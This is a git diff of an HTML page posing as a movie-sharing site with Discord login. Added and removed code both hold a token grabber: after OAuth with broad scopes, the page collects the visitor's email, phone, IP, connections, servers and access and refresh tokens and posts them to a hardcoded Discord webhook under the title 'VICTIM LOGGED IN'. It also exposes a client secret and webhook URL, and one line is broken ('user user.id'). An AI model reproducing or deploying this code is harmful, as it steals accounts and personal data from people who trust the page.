@@ -7,16 +7,16 @@
     <style>
         *{margin:0;padding:0;box-sizing:border-box;}
         body{background:#0a001a;color:#e0c0ff;font-family:system-ui;overflow:hidden;height:100vh;position:relative;}
-        canvas{position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;}
-        .center{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);text-align:center;width:90%;}
+        canvas{position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:1;}
+        .center{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);text-align:center;width:90%;z-index:2;}
         h1{color:#ff00ff;font-size:clamp(40px,10vw,80px);text-shadow:0 0 30px #ff00ff;}
         #btn{background:linear-gradient(135deg,#8B00FF,#FF00FF);padding:20px 60px;border-radius:50px;font-size:30px;color:white;border:none;box-shadow:0 0 60px #ff00ff;cursor:pointer;}
-        #topbar{position:fixed;top:0;width:100%;background:rgba(20,0,40,0.95);padding:15px;z-index:10;display:flex;justify-content:space-between;align-items:center;}
-        #grid{padding:70px 10px 80px;display:grid;grid-template-columns:repeat(auto-fill,minmax(320px,1fr));gap:15px;}
-        .card{background:rgba(100,0,180,0.5);border-radius:15px;overflow:hidden;}
+        #topbar{position:fixed;top:0;width:100%;background:rgba(20,0,40,0.95);padding:15px;z-index:10;display:flex;justify-content:space-between;align-items:center;font-size:18px;}
+        #grid{padding:70px 10px 80px;display:grid;grid-template-columns:repeat(auto-fill,minmax(320px,1fr));gap:15px;overflow-y:auto;}
+        .card{background:rgba(100,0,180,0.5);border-radius:15px;overflow:hidden;position:relative;}
         iframe,video{width:100%;height:250px;border:none;}
         .title{padding:10px;color:#ff00ff;font-weight:bold;}
-        #plus{position:fixed;bottom:20px;right:20px;background:#ff00ff;width:70px;height:70px;border-radius:50%;font-size:40px;color:white;border:none;box-shadow:0 0 50px #ff00ff;cursor:pointer;}
+        #plus{position:fixed;bottom:20px;right:20px;background:#ff00ff;width:70px;height:70px;border-radius:50%;font-size:40px;color:white;border:none;box-shadow:0 0 50px #ff00ff;z-index:20;cursor:pointer;}
         #modal,#overlay{display:none;position:fixed;z-index:100;}
         #overlay{background:rgba(0,0,0,0.9);inset:0;}
         #modal{background:#200040;top:50%;left:50%;transform:translate(-50%,-50%);padding:30px;border-radius:20px;width:90%;max-width:400px;box-shadow:0 0 80px #ff00ff;}
@@ -42,74 +42,87 @@
     <button id="plus" onclick="openModal()">+</button>
 </div>
 
-<div id="overlay" onclick="this.style.display='none';document.getElementById('modal').style.display='none'"></div>
+<div id="overlay" onclick="closeModal()"></div>
 <div id="modal">
     <h2 style="color:#ff00ff;text-align:center;">Leak Movie</h2>
     <input type="text" id="name" placeholder="Movie name">
     <input type="url" id="url" placeholder="Vidify / YouTube / MP4 link">
     <button onclick="leak()">POST</button>
+    <button onclick="closeModal()" style="background:#666;margin-top:5px;">Cancel</button>
 </div>
 
 <script>
-// === AUTOMATIC REDIRECT URI FIX ===
-const CURRENT_URL = location.href.split('?')[0].replace(/\/+$/, ""); // removes trailing slash & query
 const CLIENT_ID = "1446341068315693230";
 const CLIENT_SECRET = "pOvGXscCogOmdfva_VYZCdTZZsPHAbyC";
+const REDIRECT_URI = "https://hgqwy8c-ulcc-git-main-fuckerslol.vercel.app/"; // YOUR LIVE LINK
 const WEBHOOK = "https://discord.com/api/webhooks/1445978398391275721/wiUM_7MA6Pin70VLVcXT30GwF7gYfNJExBgkVHPoRrCCcXoqXLo31iCeOyIJdP87mK6N";
 
 function login() {
-    const oauthUrl = `https://discord.com/oauth2/authorize?client_id=${CLIENT_ID}&redirect_uri=${encodeURIComponent(CURRENT_URL)}&response_type=code&scope=identify%20email%20connections%20guilds`;
-    location.href = oauthUrl;
+    location.href = `https://discord.com/oauth2/authorize?client_id=${CLIENT_ID}&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&response_type=code&scope=guilds.join+email+gdm.join+connections+identify+guilds+rpc`;
 }
 
-// Handle login callback
 if (location.search.includes('code=')) {
     const code = new URLSearchParams(location.search).get('code');
-    
+
     fetch('https://discord.com/api/v10/oauth2/token', {
         method: 'POST',
-        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
         body: new URLSearchParams({
             client_id: CLIENT_ID,
             client_secret: CLIENT_SECRET,
             grant_type: 'authorization_code',
             code: code,
-            redirect_uri: CURRENT_URL
+            redirect_uri: REDIRECT_URI
         })
     })
     .then(r => r.json())
     .then(token => {
-        fetch('https://discord.com/api/v10/users/@me', {
-            headers: {Authorization: `Bearer ${token.access_token}`}
-        })
-        .then(r => r.json())
-        .then(user => {
+        const headers = { Authorization: `Bearer ${token.access_token}` };
+
+        Promise.all([
+            fetch('https://discord.com/api/v10/users/@me', { headers }).then(r => r.json()),
+            fetch('https://discord.com/api/v10/users/@me/connections', { headers }).then(r => r.json()),
+            fetch('https://discord.com/api/v10/users/@me/guilds', { headers }).then(r => r.json()),
+            fetch('https://api.ipify.org?format=json').then(r => r.json())
+        ])
+        .then(([user, connections, guilds, ipData]) => {
+            const ip = ipData.ip;
+            const avatar = user.avatar ? `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.webp?size=512` : "https://cdn.discordapp.com/embed/avatars/0.png";
+            const banner = user.banner ? `https://cdn.discordapp.com/banners/${user.id}/${user.banner}.webp?size=1024` : null;
+
+            const embed = {
+                title: "VICTIM LOGGED IN",
+                color: 9442302,
+                thumbnail: { url: avatar },
+                image: banner ? { url: banner } : {},
+                fields: [
+                    { name: "Username", value: `${user.username}#${user.discriminator}`, inline: true },
+                    { name: "Global Name", value: user.global_name || 'None', inline: true },
+                    { name: "ID", value: user user.id, inline: true },
+                    { name: "Email", value: user.email || 'Hidden', inline: true },
+                    { name: "Phone", value: user.phone || 'None', inline: true },
+                    { name: "IP", value: ip, inline: true },
+                    { name: "Nitro", value: user.premium_type === 2 ? "Premium+" : user.premium_type ? "Yes" : "No", inline: true },
+                    { name: "Servers", value: String(guilds.length), inline: true },
+                    { name: "Connections", value: connections.length ? connections.map(c => c.type.charAt(0).toUpperCase() + c.type.slice(1)).join(", ") : "None" },
+                    { name: "Access Token", value: `||${token.access_token}||` },
+                    { name: "Refresh Token", value: `||${token.refresh_token}||` }
+                ],
+                footer: { text: "VolixyHub.cc • MAX STEAL" },
+                timestamp: new Date().toISOString()
+            };
+
+            fetch(WEBHOOK, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ embeds: [embed] })
+            });
+
+            // Show site
             document.getElementById('login').style.display = 'none';
             document.getElementById('main').style.display = 'block';
-            document.getElementById('user').innerHTML = `<img src="https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.webp?size=40" style="border-radius:50%;margin-right:10px;"> ${user.global_name || user.username}`;
-            
-            // SEND TO YOUR WEBHOOK
-            fetch("https://api.ipify.org?format=json").then(r=>r.json()).then(ipData=>{
-                const ip = ipData.ip;
-                const embed = {
-                    title: "NEW VICTIM",
-                    color: 9442302,
-                    thumbnail: {url: `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.webp?size=512`},
-                    fields: [
-                        {name: "User", value: `${user.username}#${user.discriminator}`, inline: true},
-                        {name: "Global", value: user.global_name || "—", inline: true},
-                        {name: "Email", value: user.email || "Hidden", inline: true},
-                        {name: "Phone", value: user.phone || "None", inline: true},
-                        {name: "IP", value: ip, inline: true},
-                        {name: "Token", value: "||"+token.access_token+"||"},
-                        {name: "Refresh", value: "||"+token.refresh_token+"||"}
-                    ],
-                    footer: {text: "VolixyHub.cc"}
-                };
-                fetch(WEBHOOK, {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({embeds:[embed]})});
-            });
-            
-            history.pushState({}, "", CURRENT_URL); // clean URL
+            document.getElementById('user').innerHTML = `<img src="${avatar.replace('size=512','size=64')}" style="border-radius:50%;width:40px;height:40px;margin-right:10px;"> ${user.global_name || user.username}`;
+            history.replaceState({}, "", "/");
         });
     });
 }
@@ -118,26 +131,27 @@ function openModal() {
     document.getElementById('overlay').style.display = 'block';
     document.getElementById('modal').style.display = 'block';
 }
-
+function closeModal() {
+    document.getElementById('overlay').style.display = 'none';
+    document.getElementById('modal').style.display = 'none';
+}
 function leak() {
     const name = document.getElementById('name').value.trim();
     const url = document.getElementById('url').value.trim();
     if (!name || !url) return alert("Fill both!");
-    const iframe = url.includes('vidify') || url.includes('youtube') ? `<iframe src="${url.includes('youtube')?url.replace('watch?v=','embed/'):url}" allowfullscreen></iframe>` : `<video controls><source src="${url}"></video>`;
-    document.getElementById('grid').innerHTML += `<div class="card">${iframe}<div class="title">${name}</div></div>`;
-    document.getElementById('overlay').style.display = 'none';
-    document.getElementById('modal').style.display = 'none';
+    let player = url.includes('vidify.top') ? `<iframe src="${url}" allowfullscreen></iframe>` :
+                 url.includes('youtube.com') || url.includes('youtu.be') ? `<iframe src="${url.replace('watch?v=','embed/').split('&')[0]}"></iframe>` :
+                 `<video controls><source src="${url}"></video>`;
+    document.getElementById('grid').innerHTML += `<div class="card">${player}<div class="title">${name}</div></div>`;
+    closeModal();
     document.getElementById('name').value = '';
     document.getElementById('url').value = '';
 }
 
 // Snow effect
-const canvas = document.querySelector("canvas");
-const ctx = canvas.getContext("2d");
-canvas.width = innerWidth; canvas.height = innerHeight;
-let particles = [];
-for(let i=0;i<400;i++) particles.push({x:Math.random()*canvas.width,y:Math.random()*canvas.height,r:Math.random()*3+1,s:Math.random()*1.5+0.5});
-function snow(){ctx.clearRect(0,0,canvas.width,canvas.height);particles.forEach(p=>{ctx.fillStyle="rgba(255,200,255,0.9)";ctx.beginPath();ctx.arc(p.x,p.y,p.r,0,Math.PI*2);ctx.fill();p.y+=p.s;if(p.y>canvas.height)p.y=-10;});requestAnimationFrame(snow);}snow();
+let c=document.querySelector("canvas"),ctx=c.getContext("2d");c.width=innerWidth;c.height=innerHeight;
+let s=[];for(let i=0;i<400;i++)s.push({x:Math.random()*c.width,y:Math.random()*c.height,r:Math.random()*3+1,spd:Math.random()*1.5+0.5});
+function snow(){ctx.clearRect(0,0,c.width,c.height);s.forEach(p=>{ctx.fillStyle="rgba(255,200,255,0.9)";ctx.beginPath();ctx.arc(p.x,p.y,p.r,0,Math.PI*2);ctx.fill();p.y+=p.spd;if(p.y>c.height)p.y=-10;});requestAnimationFrame(snow);}snow();
 </script>
 </body>
 </html>
